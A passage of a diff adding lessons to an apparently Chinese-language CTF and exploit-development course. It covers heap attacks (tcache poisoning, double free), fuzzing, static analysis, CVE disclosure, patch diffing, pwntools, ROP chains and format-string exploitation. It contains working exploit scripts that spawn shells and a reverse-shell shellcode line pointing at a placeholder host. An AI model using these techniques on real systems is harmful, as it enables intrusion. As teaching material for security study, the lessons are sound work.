+<span class="cm">#   *(chunk_A + 8) = 0x7f...a8b8  ← 覆蓋 fd 指標</span>
+<span class="cm">#   tcache[0x20] → chunk_A → 0x7f...a8b8（__free_hook）→ ...</span>
+
+<span class="cm"># STEP 4：連續 malloc 兩次</span>
+<span class="cm">#   malloc(0x20) → 返回 chunk_A（正常分配）</span>
+<span class="cm">#   malloc(0x20) → 返回 0x7f...a8b8（__free_hook 地址！）</span>
+
+<span class="cm"># STEP 5：向 __free_hook 寫入 system() 地址</span>
+<span class="cm">#   *(__free_hook) = system</span>
+
+<span class="cm"># STEP 6：free(ptr_to_bin_sh) → 觸發 system("/bin/sh")</span>
+<span class="cm">#   任何 free("/bin/sh") 都相當於呼叫 system("/bin/sh")</span>
+
+<span class="cm"># ─── 注意：glibc 2.32+ 加入了 Safe-Linking 保護 ───</span>
+<span class="cm"># fd 指標現在被加密：fd = (chunk_addr >> 12) XOR next_chunk</span>
+<span class="cm"># 需要先洩露 Heap 地址才能計算正確的偽造 fd 值</span></pre>
+</div>
+</div>
+
+<!-- L3-4 Double Free -->
+<div class="cb" id="l3-4">
+<h2>Double Free 與 fastbin 攻擊</h2>
+<p>Double Free 是對同一個指標呼叫兩次 <code>free()</code>。在 tcache 中，glibc 2.29 前幾乎沒有針對 Double Free 的檢查，可以直接利用；2.29 後加入了 key 欄位檢測，需要額外手段清除。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">tcache Double Free 攻擊</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cm"># ─── tcache Double Free（glibc 2.26–2.28）───</span>
+<span class="cm"># STEP 1：分配 chunk_A</span>
+<span class="cm"># malloc_A = malloc(0x20)  → 0x602260</span>
+
+<span class="cm"># STEP 2：Double Free</span>
+<span class="cm"># free(malloc_A)   → tcache[0x20]: A → NULL</span>
+<span class="cm"># free(malloc_A)   → tcache[0x20]: A → A → A → ...（循環！）</span>
+<span class="cm"># （2.28 以下無 double free 檢查）</span>
+
+<span class="cm"># STEP 3：修改 fd</span>
+<span class="cm"># malloc(0x20)  → 返回 A，tcache[0x20]: A → A...</span>
+<span class="cm"># 向 A 寫入目標地址（修改 fd = &target）</span>
+<span class="cm"># tcache[0x20]: A → &target</span>
+
+<span class="cm"># STEP 4：連續 malloc</span>
+<span class="cm"># malloc(0x20)  → 返回 A（再次）</span>
+<span class="cm"># malloc(0x20)  → 返回 &target（任意地址寫！）</span>
+
+<span class="cm"># ─── glibc 2.29+ Double Free 繞過 ───</span>
+<span class="cm"># 2.29 在空閒 chunk 的 key 欄位寫入 tcache 結構體地址</span>
+<span class="cm"># free() 時檢查 key 欄位，若等於 tcache 地址則判定 double free</span>
+<span class="cm"># 繞過：在第二次 free 前，將 key 欄位清零（需要寫入原語）</span>
+
+<span class="cm"># ─── fastbin dup（更老的技術，針對 fastbin）───</span>
+<span class="cm"># fastbin 無 tcache 的 key 保護，但有 double free 檢查</span>
+<span class="cm"># （檢查當前 chunk 是否等於 fastbin 鏈表的頭節點）</span>
+<span class="cm"># 繞過：在兩次 free 之間插入另一個不同的 chunk：</span>
+<span class="cm"># free(A) → free(B) → free(A)   ← A 不是 fastbin 頭部，檢查通過</span>
+<span class="cm"># fastbin[0x20]: A → B → A → B → ...（循環）</span></pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在 Heap Exploit 中，tcache poisoning 的目標通常是覆蓋哪個 glibc 的 hook 函式，從而在呼叫它時觸發 shell？（在 glibc 2.34 之前普遍使用）</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span><code>__stack_chk_fail</code>（Stack Canary 失敗時呼叫）</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span><code>__free_hook</code> 或 <code>__malloc_hook</code>（glibc 提供的 Hook 指標）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span><code>__libc_start_main</code>（程式進入點）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span><code>exit</code>（程式結束時呼叫）</div>
+  </div>
+  <div class="q-exp">正確！<code>__free_hook</code> 和 <code>__malloc_hook</code> 是 glibc 在 malloc/free 中提供的函式指標（Hook），若非 NULL 則在 malloc()/free() 時被呼叫。在 glibc 2.34 之前，這兩個 Hook 位於 libc 的可寫段（.bss），地址固定（libc 基地址已知即可計算）。通過 tcache poisoning 將任意 malloc 分配到 <code>__free_hook</code>，然後寫入 <code>system</code> 函式地址，下次 <code>free(ptr)</code> 就等效於 <code>system(ptr)</code>。glibc 2.34 移除了這兩個 Hook，現代 Heap Exploit 需要改用其他目標（如 <code>_IO_FILE</code> 結構體中的函式指標）。</div>
+</div>
+</div>
+
+
+<!-- ===== CH4: 漏洞研究方法 ===== -->
+
+<!-- L4-1 Fuzzing -->
+<div class="cb" id="l4-1">
+<h2>模糊測試（Fuzzing）：AFL++ / libFuzzer</h2>
+<p>模糊測試（Fuzzing）是通過向程式自動投餵大量隨機或變異的輸入，觀察是否觸發崩潰或異常，從而發現漏洞的技術。Coverage-guided Fuzzing（覆蓋率引導）是目前最有效的方法，能自動探索程式所有代碼路徑。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">AFL++（American Fuzzy Lop++）</div><div class="kt-d">最廣泛使用的 Coverage-Guided Fuzzer。通過編譯時插樁追蹤代碼覆蓋率，優先變異能探索新路徑的輸入。支援多種變異策略、平行模糊、持久模式（persistent mode）大幅提升速度。已發現數千個 CVE。</div></div>
+  <div class="kt"><div class="kt-n">libFuzzer</div><div class="kt-d">LLVM 內建的 In-Process Fuzzer，以函式庫形式集成到目標程式中，直接呼叫 LLVMFuzzerTestOneInput()。速度極快（無進程啟動開銷）、與 AddressSanitizer（ASan）完美配合。適合庫函式和 API 的 Fuzzing。</div></div>
+  <div class="kt"><div class="kt-n">Sanitizers（錯誤偵測）</div><div class="kt-d">編譯時插入的錯誤偵測工具：ASan（AddressSanitizer）偵測記憶體越界/UAF；UBSan（UndefinedBehaviorSanitizer）偵測未定義行為；MSan（MemorySanitizer）偵測未初始化記憶體使用。與 Fuzzer 配合使用，將崩潰轉化為可偵測的錯誤。</div></div>
+  <div class="kt"><div class="kt-n">覆蓋率（Coverage）指標</div><div class="kt-d">Edge Coverage（邊覆蓋）：追蹤程式中基本塊之間的跳轉邊，比 Block Coverage 更精細。AFL++ 以 bitmap 形式記錄覆蓋率，若新輸入觸發新邊則加入語料庫（corpus）繼續變異。</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">AFL++ 完整使用流程</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 安裝 AFL++ ───</span>
+apt install afl++   <span class="cm"># 或從源碼編譯獲得最新版</span>
+git clone https://github.com/AFLplusplus/AFLplusplus
+cd AFLplusplus && make distrib && sudo make install
+
+<span class="cm"># ─── STEP 1：編譯目標（插入 AFL 插樁）───</span>
+<span class="cm"># 使用 afl-clang-fast 替代 clang 編譯器</span>
+CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --disable-shared
+CC=afl-clang-fast make -j$(nproc)
+
+<span class="cm"># 或針對單個源文件：</span>
+afl-clang-fast -o target_fuzz target.c -fsanitize=address  <span class="cm"># 加上 ASan</span>
+
+<span class="cm"># ─── STEP 2：準備語料庫（初始輸入）───</span>
+mkdir -p in/ out/
+echo "hello" > in/seed1           <span class="cm"># 提供有效的初始輸入</span>
+echo '{"key":"value"}' > in/seed2  <span class="cm"># 越接近真實輸入，覆蓋率越高</span>
+
+<span class="cm"># ─── STEP 3：啟動 Fuzzing ───</span>
+<span class="cm"># @@ 是輸入文件路徑的佔位符（AFL 會替換為每個測試用例的臨時文件）</span>
+afl-fuzz -i in/ -o out/ ./target_fuzz @@
+
+<span class="cm"># 多核平行（1個主進程 + N-1個次進程）</span>
+afl-fuzz -i in/ -o out/ -M fuzzer01 ./target_fuzz @@   <span class="cm"># 主進程</span>
+afl-fuzz -i in/ -o out/ -S fuzzer02 ./target_fuzz @@   <span class="cm"># 次進程</span>
+afl-fuzz -i in/ -o out/ -S fuzzer03 ./target_fuzz @@
+
+<span class="cm"># ─── STEP 4：分析崩潰 ───</span>
+ls out/default/crashes/            <span class="cm"># 觸發崩潰的輸入文件</span>
+ls out/default/hangs/              <span class="cm"># 導致超時的輸入</span>
+
+<span class="cm"># 使用崩潰輸入重現並用 GDB 分析</span>
+gdb -q ./target_fuzz
+(pwndbg) run < out/default/crashes/id:000001,sig:11,...
+(pwndbg) bt                        <span class="cm"># 查看崩潰時的呼叫棧</span>
+
+<span class="cm"># ─── libFuzzer 目標函式格式 ───</span></pre>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">C — libFuzzer 目標函式</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="kw">#include</span> <span class="st">&lt;stdint.h&gt;</span>
+<span class="kw">#include</span> <span class="st">&lt;string.h&gt;</span>
+
+<span class="cm">// libFuzzer 入口函式：每次測試呼叫一次</span>
+<span class="kw">extern</span> <span class="st">"C"</span> <span class="kw">int</span> <span class="fn">LLVMFuzzerTestOneInput</span>(<span class="kw">const</span> <span class="kw">uint8_t</span> *data, <span class="kw">size_t</span> size) {
+    <span class="cm">// 將 fuzzer 提供的 data 傳入目標函式</span>
+    <span class="kw">char</span> buf[<span class="nu">256</span>];
+    <span class="kw">if</span> (size > <span class="kw">sizeof</span>(buf)) <span class="kw">return</span> <span class="nu">0</span>;  <span class="cm">// 避免過大輸入</span>
+    <span class="fn">memcpy</span>(buf, data, size);
+    <span class="fn">target_parse_function</span>(buf, size);  <span class="cm">// 目標函式</span>
+    <span class="kw">return</span> <span class="nu">0</span>;
+}
+
+<span class="cm">// 編譯：</span>
+<span class="cm">// clang -fsanitize=fuzzer,address -o fuzz_target fuzz_target.cpp target.c</span>
+<span class="cm">// 執行：</span>
+<span class="cm">// ./fuzz_target corpus/ -max_total_time=3600 -jobs=8</span></pre>
+</div>
+</div>
+
+<!-- L4-2 靜態分析 -->
+<div class="cb" id="l4-2">
+<h2>靜態分析：CodeQL / Semgrep</h2>
+<p>靜態分析通過掃描源碼（或二進制）找到潛在漏洞，無需執行程式。適合大型代碼庫的系統性漏洞挖掘。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>工具</th><th>分析方式</th><th>適用場景</th><th>特點</th></tr></thead>
+    <tbody>
+      <tr><td><strong>CodeQL</strong></td><td>將代碼轉換為關係資料庫，用類 SQL 的查詢語言（QL）搜索漏洞模式；支援資料流分析（追蹤不可信輸入如何流向危險函式）</td><td>大型開源項目（GitHub Actions 集成）；尋找特定漏洞類型（注入/越界/UAF）</td><td>GitHub 官方支援；查詢可复用；可用於 CTF 逆向</td></tr>
+      <tr><td><strong>Semgrep</strong></td><td>基於語法樹（AST）的模式匹配，規則用 YAML 撰寫，學習曲線低</td><td>快速掃描特定不安全函式（gets/strcpy/eval）；CI/CD 集成；自訂安全規則</td><td>速度快；規則庫（Registry）豐富；多語言支援</td></tr>
+      <tr><td><strong>Infer</strong></td><td>Facebook 開源的靜態分析工具，專注於 null dereference、resource leak、memory error</td><td>Android/iOS 應用代碼；大型 C/C++ 項目</td><td>高精度，誤報少；增量分析（只分析改動部分）</td></tr>
+      <tr><td><strong>Ghidra / Binary Ninja</strong></td><td>二進制靜態分析（反組譯/反編譯），無需源碼</td><td>封閉源碼漏洞研究；逆向分析 malware；CVE 漏洞定位</td><td>Ghidra 免費且有腳本 API；Binary Ninja 有商業版和 Community</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">CodeQL — 搜索 C/C++ 緩衝區溢位查詢</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">/**
+ * CodeQL 查詢：找到不安全的 gets() 呼叫
+ * @name Use of gets
+ * @kind path-problem
+ */</span>
+<span class="kw">import</span> cpp
+<span class="kw">import</span> semmle.code.cpp.dataflow.TaintTracking
+
+<span class="cm">// 找到所有對 gets() 的呼叫</span>
+<span class="kw">from</span> FunctionCall call
+<span class="kw">where</span> call.getTarget().getName() = <span class="st">"gets"</span>
+<span class="kw">select</span> call, <span class="st">"Unsafe use of gets() - buffer overflow risk"</span>
+
+<span class="cm">---</span>
+
+<span class="cm">// 更進階：追蹤用戶輸入（source）流向 memcpy 的長度參數（sink）</span>
+<span class="kw">class</span> UserInputToMemcpyLen <span class="kw">extends</span> TaintTracking::Configuration {
+  <span class="kw">override predicate</span> <span class="fn">isSource</span>(DataFlow::Node src) {
+    <span class="cm">// source：scanf/fgets/read 的輸出</span>
+    <span class="kw">exists</span>(FunctionCall fc | fc.getTarget().getName() = <span class="st">"scanf"</span>
+      <span class="kw">and</span> src.asExpr() = fc.getAnArgument())
+  }
+  <span class="kw">override predicate</span> <span class="fn">isSink</span>(DataFlow::Node sink) {
+    <span class="cm">// sink：memcpy 的第三個參數（length）</span>
+    <span class="kw">exists</span>(FunctionCall fc | fc.getTarget().getName() = <span class="st">"memcpy"</span>
+      <span class="kw">and</span> sink.asExpr() = fc.getArgument(<span class="nu">2</span>))
+  }
+}</pre>
+</div>
+</div>
+
+<!-- L4-3 CVE 流程 -->
+<div class="cb" id="l4-3">
+<h2>漏洞披露與 CVE 流程</h2>
+<p>負責任披露（Responsible Disclosure / Coordinated Vulnerability Disclosure）是漏洞研究倫理的核心原則：在公開披露前給予廠商修補的機會，通常為 90 天（Google Project Zero 的標準）。</p>
+
+<div class="atkflow">
+  <div class="af-step s1"><span class="af-n">STEP 1</span><div><div class="af-t">發現與確認</div><div class="af-d">通過 Fuzzing、靜態分析、代碼審計或動態測試發現漏洞。確認漏洞可重現、評估嚴重程度（CVSS 評分）和利用可行性。準備 PoC（Proof of Concept）代碼。</div></div></div>
+  <div class="af-step s2"><span class="af-n">STEP 2</span><div><div class="af-t">聯繫廠商（或 CERT）</div><div class="af-d">尋找廠商的安全聯絡方式（security@company.com、HackerOne、Bugcrowd Bug Bounty 平台）。若廠商無明確安全聯絡管道，可通過 CERT/CC 或國家 CERT 協調。加密傳輸漏洞細節（PGP）。</div></div></div>
+  <div class="af-step s3"><span class="af-n">STEP 3</span><div><div class="af-t">90 天披露時鐘開始</div><div class="af-d">廠商確認收到報告後，負責任披露的 90 天計時開始（Project Zero 標準；HackerOne/Bugcrowd 平台通常 90-180 天）。廠商應提供修復時間表，若無回應或拒絕修復，研究者可在期限後公開披露。</div></div></div>
+  <div class="af-step s4"><span class="af-n">STEP 4</span><div><div class="af-t">CVE 申請</div><div class="af-d">CVE（Common Vulnerabilities and Exposures）是公開的漏洞識別編號。申請方式：（1）廠商（CNA）自行申請；（2）研究者通過 MITRE CVE 申請表（https://cve.mitre.org/cve/request_id.html）；（3）大型漏洞賞金平台（HackerOne 是 CNA）可直接分配。需提供漏洞描述、影響版本、CVSS 評分。</div></div></div>
+  <div class="af-step s5"><span class="af-n">STEP 5</span><div><div class="af-t">補丁發布與公開披露</div><div class="af-d">廠商發布修復補丁後，研究者可撰寫技術部落格、在安全會議（DEF CON / Black Hat / CCC）發表演講，或在 FullDisclosure / GitHub 發布完整 PoC。公開披露包括：漏洞描述、根本原因分析、PoC 代碼、修復建議。</div></div></div>
+  <div class="af-step s6"><span class="af-n">REWARD</span><div><div class="af-t">漏洞賞金（Bug Bounty）</div><div class="af-d">主要平台：HackerOne、Bugcrowd、Intigriti。獎金範圍：幾百美元（低危）到數十萬美元（嚴重 RCE）。Google、Apple、Microsoft、Meta 等大公司的嚴重漏洞可達 $50,000-$1,000,000+。ZDI（Zero Day Initiative）也購買 0-day 漏洞。</div></div></div>
+</div>
+</div>
+
+<!-- L4-4 Patch Diffing -->
+<div class="cb" id="l4-4">
+<h2>1-day 分析：Patch Diffing</h2>
+<p>1-day（One-day）漏洞分析是在廠商發布安全補丁後，通過比對補丁前後的二進制差異（Patch Diffing）來逆向分析漏洞細節，並在大多數用戶還未更新前開發出 Exploit。這是安全研究和威脅情報的重要技能。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Patch Diffing 工作流程</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 工具選擇 ───</span>
+<span class="cm"># BinDiff（免費，Ghidra 和 IDA 插件）</span>
+<span class="cm"># Diaphora（開源，IDA 插件，更先進的演算法）</span>
+<span class="cm"># bindiff CLI</span>
+
+<span class="cm"># ─── STEP 1：獲取補丁前後的二進制 ───</span>
+<span class="cm"># Windows 補丁：下載 MSI/MSU，用 expand 工具提取 DLL</span>
+expand -f:* windows10.msu C:\patch_files\
+<span class="cm"># 或從 Windows Update Catalog 下載舊版和新版 DLL</span>
+
+<span class="cm"># Linux：比對舊版和新版套件</span>
+apt-get download libssl1.1=1.1.1f-1ubuntu2.16  <span class="cm"># 補丁版</span>
+apt-get download libssl1.1=1.1.1f-1ubuntu2.15  <span class="cm"># 舊版</span>
+dpkg -x libssl1.1_*.deb .                       <span class="cm"># 解包提取 .so</span>
+
+<span class="cm"># ─── STEP 2：用 Ghidra + BinDiff 進行差異分析 ───</span>
+<span class="cm"># 1. 在 Ghidra 中分別分析兩個二進制（完整分析）</span>
+<span class="cm"># 2. 匯出 Ghidra 的 BinExport 格式（.BinExport 文件）</span>
+<span class="cm"># 3. 執行 BinDiff 比對兩個 .BinExport</span>
+<span class="cm"># 4. 查看差異報告：Changed Functions（修改的函式）</span>
+
+<span class="cm"># ─── STEP 3：聚焦分析修改的函式 ───</span>
+<span class="cm"># BinDiff 會標出：</span>
+<span class="cm"># - Identical（未修改）</span>
+<span class="cm"># - Changed（有修改，按相似度排序）← 重點分析這些！</span>
+<span class="cm"># - Unmatched（新增或刪除的函式）</span>
+
+<span class="cm"># ─── STEP 4：逆向分析漏洞根本原因 ───</span>
+<span class="cm"># 常見修復模式：</span>
+<span class="cm"># 1. 添加長度檢查（修復：size_t check before memcpy）→ 原漏洞：整數溢位/越界讀寫</span>
+<span class="cm"># 2. 添加 NULL 指標檢查 → 原漏洞：NULL dereference</span>
+<span class="cm"># 3. 修改 free 後設 NULL → 原漏洞：UAF</span>
+<span class="cm"># 4. 修復條件判斷順序 → 原漏洞：TOCTOU（Time-of-Check Time-of-Use）</span>
+<span class="cm"># 5. 添加 mutex 鎖 → 原漏洞：Race Condition</span></pre>
+</div>
+</div>
+
+
+<!-- ===== CH5: Exploit 開發工具鏈 ===== -->
+
+<!-- L5-1 pwntools -->
+<div class="cb" id="l5-1">
+<h2>pwntools：Python Exploit 框架</h2>
+<p>pwntools 是 CTF 和漏洞利用開發的標準 Python 框架，提供進程通訊、二進制操作、Shellcode 生成、ROP 鏈構建等一站式功能，大幅縮短 Exploit 開發時間。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">pwntools 核心 API 速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cm"># ─── 環境設定 ───</span>
+context.arch       = <span class="st">'amd64'</span>    <span class="cm"># i386 / amd64 / arm / aarch64 / mips</span>
+context.os         = <span class="st">'linux'</span>
+context.log_level  = <span class="st">'info'</span>    <span class="cm"># debug（詳細）/ info / warning</span>
+context.terminal   = [<span class="st">'tmux'</span>, <span class="st">'splitw'</span>, <span class="st">'-h'</span>]  <span class="cm"># GDB 彈出終端設定</span>
+
+<span class="cm"># ─── 進程 / 連線 ───</span>
+p = process(<span class="st">'./vuln'</span>)                     <span class="cm"># 本地進程</span>
+p = remote(<span class="st">'pwn.challenge.com'</span>, <span class="nu">9999</span>)    <span class="cm"># 遠端 TCP 連線</span>
+p = process([<span class="st">'./vuln'</span>], env={<span class="st">'LD_PRELOAD'</span>: <span class="st">'./libc.so.6'</span>})  <span class="cm"># 指定 libc</span>
+
+<span class="cm"># ─── 發送與接收 ───</span>
+p.send(data)            <span class="cm"># 發送 bytes（無換行）</span>
+p.sendline(data)        <span class="cm"># 發送 bytes + '\n'</span>
+p.sendafter(b<span class="st">'prompt'</span>, data)    <span class="cm"># 等待 'prompt' 出現後發送</span>
+p.sendlineafter(b<span class="st">'> '</span>, data)    <span class="cm"># 等待後發送（最常用！）</span>
+
+p.recv(<span class="nu">8</span>)              <span class="cm"># 接收恰好 8 bytes</span>
+p.recvline()           <span class="cm"># 接收一行（到 '\n'）</span>
+p.recvuntil(b<span class="st">':\n'</span>)   <span class="cm"># 接收直到指定模式</span>
+p.recvall()            <span class="cm"># 接收所有資料直到 EOF</span>
+p.interactive()        <span class="cm"># 進入互動模式（取得 shell 後使用）</span>
+
+<span class="cm"># ─── ELF 二進制解析 ───</span>
+elf = ELF(<span class="st">'./vuln'</span>)
+elf.symbols[<span class="st">'main'</span>]      <span class="cm"># 函式地址</span>
+elf.plt[<span class="st">'puts'</span>]          <span class="cm"># PLT 表地址（用於 ret2plt）</span>
+elf.got[<span class="st">'puts'</span>]          <span class="cm"># GOT 表地址（用於地址洩露）</span>
+elf.search(b<span class="st">'/bin/sh'</span>)   <span class="cm"># 在二進制中搜索字串</span>
+elf.address              <span class="cm"># 基地址（可手動設定實現 ASLR 計算）</span>
+
+<span class="cm"># ─── 資料打包（字節序轉換）───</span>
+p64(<span class="nu">0xdeadbeef</span>)          <span class="cm"># 打包為 8 bytes 小端序</span>
+p32(<span class="nu">0xdeadbeef</span>)          <span class="cm"># 打包為 4 bytes 小端序</span>
+u64(b<span class="st">'\xef\xbe\xad\xde\x00\x00\x00\x00'</span>)  <span class="cm"># 解包 8 bytes → int</span>
+flat(<span class="nu">0x400500</span>, b<span class="st">'A'</span>*<span class="nu">8</span>, <span class="nu">0x601050</span>)  <span class="cm"># 自動打包多個值</span>
+
+<span class="cm"># ─── Shellcode 生成 ───</span>
+asm(shellcraft.sh())                      <span class="cm"># 生成 execve /bin/sh</span>
+asm(shellcraft.linux.connect(<span class="st">'1.2.3.4'</span>, <span class="nu">4444</span>))  <span class="cm"># 反彈 shell</span>
+asm(<span class="st">"push rdi; pop rsi; ret"</span>)           <span class="cm"># 自訂 asm → bytes</span>
+disasm(b<span class="st">'\x55\x48\x89\xe5'</span>)             <span class="cm"># bytes → 反組譯文字</span>
+
+<span class="cm"># ─── GDB 調試整合 ───</span>
+gdb.attach(p, gdbscript=<span class="st">"""</span>
+<span class="st">    break main</span>
+<span class="st">    continue</span>
+<span class="st">"""</span>)   <span class="cm"># 附加 GDB 到正在執行的進程</span>
+
+p = gdb.debug(<span class="st">'./vuln'</span>, gdbscript=<span class="st">"break *main+50\ncontinue\n"</span>)</pre>
+</div>
+</div>
+
+<!-- L5-2 ROPgadget / ROP 鏈構建 -->
+<div class="cb" id="l5-2">
+<h2>ROPgadget / pwntools ROP 鏈構建</h2>
+<p>ROP 鏈構建需要：尋找合適的 Gadget（ROPgadget / ropper / pwntools ROP）、排列 Gadget 和資料，形成完整的攻擊鏈。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">ROPgadget 搜索與 pwntools 自動構建</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── ROPgadget：搜索 Gadget ───</span>
+ROPgadget --binary ./vuln                       <span class="cm"># 列出所有 gadget</span>
+ROPgadget --binary ./vuln --rop                 <span class="cm"># 只列出 ROP gadget（以 ret 結尾）</span>
+ROPgadget --binary ./vuln --string "/bin/sh"    <span class="cm"># 搜索字串</span>
+ROPgadget --binary libc.so.6 --rop | grep "pop rdi"   <span class="cm"># 在 libc 中搜索</span>
+
+<span class="cm"># 搜索 syscall gadget（用於 SROP）</span>
+ROPgadget --binary ./vuln --rop | grep "syscall"
+
+<span class="cm"># ─── ropper（另一個 gadget 搜索工具）───</span>
+ropper -f ./vuln --search "pop rdi"
+ropper -f ./vuln --chain execve           <span class="cm"># 自動生成 execve 呼叫鏈</span>
+
+<span class="cm"># ─── pwntools ROP 類（自動化構建）───</span>
+<span class="kw">from</span> pwn <span class="kw">import</span> *
+
+elf  = ELF(<span class="st">'./vuln'</span>)
+libc = ELF(<span class="st">'/lib/x86_64-linux-gnu/libc.so.6'</span>)
+
+<span class="cm"># 從 ELF 和 libc 中自動搜索 gadget</span>
+rop = ROP([elf, libc])
+
+<span class="cm"># ─── 常見 ROP 鏈模式 ───</span>
+<span class="cm"># 1. 呼叫函式（pwntools 自動處理參數）</span>
+rop.call(<span class="st">'puts'</span>, [elf.got[<span class="st">'puts'</span>]])    <span class="cm"># puts(got['puts'])</span>
+rop.call(<span class="st">'system'</span>, [next(libc.search(b<span class="st">'/bin/sh\x00'</span>))])
+
+<span class="cm"># 2. 手動排列 gadget</span>
+rop.raw(rop.find_gadget([<span class="st">'pop rdi'</span>, <span class="st">'ret'</span>])[<span class="nu">0</span>])  <span class="cm"># pop rdi; ret</span>
+rop.raw(p64(next(libc.search(b<span class="st">'/bin/sh\x00'</span>))))
+rop.raw(p64(libc.sym[<span class="st">'system'</span>]))
+
+<span class="cm"># 3. 生成 Payload</span>
+payload = b<span class="st">'A'</span> * offset + rop.chain()
+<span class="fn">log.info</span>(rop.dump())    <span class="cm"># 印出 ROP 鏈的可讀形式</span>
+
+<span class="cm"># ─── ret2syscall（無 libc 時直接 syscall）───</span>
+<span class="cm"># 目標：execve("/bin/sh", NULL, NULL)</span>
+<span class="cm"># 需要：rax=59, rdi=&"/bin/sh", rsi=0, rdx=0, then syscall</span>
+rop.raw(rop.find_gadget([<span class="st">'pop rax'</span>, <span class="st">'ret'</span>])[<span class="nu">0</span>])
+rop.raw(p64(<span class="nu">59</span>))                     <span class="cm"># syscall number for execve</span>
+rop.raw(rop.find_gadget([<span class="st">'pop rdi'</span>, <span class="st">'ret'</span>])[<span class="nu">0</span>])
+rop.raw(p64(binsh_addr))
+rop.raw(rop.find_gadget([<span class="st">'pop rsi'</span>, <span class="st">'pop rdx'</span>, <span class="st">'ret'</span>])[<span class="nu">0</span>])
+rop.raw(p64(<span class="nu">0</span>)); rop.raw(p64(<span class="nu">0</span>))
+rop.raw(rop.find_gadget([<span class="st">'syscall'</span>, <span class="st">'ret'</span>])[<span class="nu">0</span>])</pre>
+</div>
+</div>
+
+<!-- L5-3 格式化字串 -->
+<div class="cb" id="l5-3">
+<h2>格式化字串漏洞（Format String）</h2>
+<p>格式化字串漏洞（Format String Bug）發生在程式直接將用戶輸入作為 <code>printf()</code> 的格式字串參數。攻擊者可以利用 <code>%x</code>/<code>%p</code> 洩露記憶體，或用 <code>%n</code> 向任意地址寫入。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">格式化字串漏洞利用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">/* ─── 漏洞代碼 ─── */</span>
+<span class="kw">char</span> buf[<span class="nu">256</span>];
+<span class="fn">fgets</span>(buf, <span class="kw">sizeof</span>(buf), stdin);
+<span class="fn">printf</span>(buf);    <span class="cm">// 危險！應為 printf("%s", buf)</span>
+
+<span class="cm"># ─── Python 利用腳本 ───</span>
+<span class="kw">from</span> pwn <span class="kw">import</span> *
+
+p = process(<span class="st">'./fmtstr'</span>)
+elf = ELF(<span class="st">'./fmtstr'</span>)
+
+<span class="cm"># ─── 1. 洩露 Stack 上的值（找 Canary / libc 地址）───</span>
+p.sendlineafter(b<span class="st">'> '</span>, b<span class="st">"%p %p %p %p %p %p %p %p"</span>)
+leak = p.recvline()
+<span class="cm"># 輸出：0x7f... 0x400... 0x... ← 找到 libc 地址（0x7f 開頭）</span>
+
+<span class="cm"># ─── 2. 讀取特定位置（第 N 個參數）───</span>
+<span class="cm"># %N$p 讀取 printf 第 N 個 Stack 參數</span>
+p.sendlineafter(b<span class="st">'> '</span>, b<span class="st">"%7$p"</span>)      <span class="cm"># 讀取第 7 個 Stack 上的值</span>
+
+<span class="cm"># 找到 Canary 的位置（Canary 通常以 0x...00 結尾，特徵明顯）</span>
+<span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="nu">1</span>, <span class="nu">30</span>):
+    p.sendlineafter(b<span class="st">'> '</span>, f<span class="st">"%{i}$016lx"</span>.encode())
+    val = <span class="fn">int</span>(p.recvline().strip(), <span class="nu">16</span>)
+    <span class="fn">log.info</span>(f<span class="kw">"{i}: {hex(val)}"</span>)
+    <span class="kw">if</span> val & <span class="nu">0xff</span> == <span class="nu">0</span> <span class="kw">and</span> val != <span class="nu">0</span>:
+        <span class="fn">log.success</span>(f<span class="kw">"Canary @ position {i}: {hex(val)}"</span>)
+
+<span class="cm"># ─── 3. 任意地址寫（%n 格式符）───</span>
+<span class="cm"># %n 將「已輸出字符數」寫入對應指標參數指向的地址</span>
+<span class="cm"># pwntools fmtstr_payload 自動計算 Payload（最簡單方式）</span>
+
+<span class="cm"># 將 GOT 中的 printf 改為 system（若 printf 被呼叫時 rdi 是可控字串）</span>
+writes = {elf.got[<span class="st">'printf'</span>]: elf.plt[<span class="st">'system'</span>]}
+payload = fmtstr_payload(<span class="nu">6</span>, writes)   <span class="cm"># 6 = 格式字串在 printf 的第幾個 Stack 位置</span>
+p.sendlineafter(b<span class="st">'> '</span>, payload)
+
+<span class="cm"># 下次 printf(user_input) 且 user_input = "/bin/sh" 時</span>
+<span class="cm"># 實際呼叫 system("/bin/sh")</span>
+p.sendlineafter(b<span class="st">'> '</span>, b<span class="st">"/bin/sh"</span>)
+p.interactive()</pre>
+</div>
+</div>
+
+<!-- L5-4 CTF PWN 策略 -->
+<div class="cb" id="l5-4">
+<h2>CTF 練習：PWN 題型策略</h2>
+<p>PWN 題（二進制利用）是 CTF 中技術含量最高的題型。掌握系統性的解題策略，能大幅提升解題速度和覆蓋率。</p>
+
+<div class="ilist">
